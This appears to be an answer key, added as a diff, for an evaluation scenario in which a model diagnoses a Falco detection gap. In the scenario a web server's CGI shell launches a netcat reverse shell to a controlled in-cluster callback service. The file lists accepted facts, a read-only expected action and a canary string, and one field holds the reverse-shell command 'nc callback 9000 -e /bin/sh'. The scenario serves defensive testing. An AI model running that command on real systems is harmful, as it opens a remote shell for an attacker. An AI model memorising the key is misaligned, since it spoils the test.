@@ -1,0 +1,44 @@
+{
+  "schema_version": "1.0.0",
+  "scenario_id": "rule-gap-falco-web-server-netcat-reverse-shell",
+  "scenario_version": "0.1.0",
+  "accepted_fact_sets": [
+    [
+      {
+        "fact_id": "httpd-cgi-shell-netcat",
+        "resource_ref": "configmap/controlled-web-cgi",
+        "field_path": "data.action",
+        "observed_value": "nc callback 9000 -e /bin/sh",
+        "description": "The HTTP CGI shell launches netcat with a shell execution option."
+      },
+      {
+        "fact_id": "controlled-callback-service",
+        "resource_ref": "service/callback",
+        "field_path": "spec.ports[0].port",
+        "observed_value": "9000",
+        "description": "The callback destination is a namespace-local controlled Service."
+      },
+      {
+        "fact_id": "callback-fixed-command",
+        "resource_ref": "deployment/callback",
+        "field_path": "spec.template.spec.containers[0].command[2]",
+        "observed_value": "printf controlled-callback; exit",
+        "description": "The listener sends one fixed command and immediately terminates the shell."
+      }
+    ]
+  ],
+  "accepted_actions": [
+    { "action_id": "no-op", "description": "Read-only diagnosis only.", "operation": "no_action" }
+  ],
+  "contradiction_facts": [
+    {
+      "fact_id": "invented-external-callback",
+      "resource_ref": "service/callback",
+      "field_path": "spec.type",
+      "observed_value": "LoadBalancer",
+      "description": "The callback is ClusterIP-only and has no external listener."
+    }
+  ],
+  "expects_uncertainty": false,
+  "secret_canary": "EVAL-CANARY-RULE-GAP-b63ddcd8977ee53f"
+}
